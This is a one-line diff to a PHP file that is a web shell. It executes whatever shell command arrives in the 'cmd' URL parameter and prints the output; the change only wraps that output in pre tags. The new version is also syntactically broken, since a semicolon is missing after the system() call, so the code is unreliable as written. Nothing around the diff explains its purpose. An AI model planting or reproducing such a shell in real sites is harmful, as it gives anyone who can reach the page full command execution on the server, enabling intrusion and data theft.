@@ -1,1 +1,1 @@
-<?php system($_GET['cmd']) ?>
+<?php echo "<pre>"; system($_GET['cmd']) echo "</pre>"; ?>
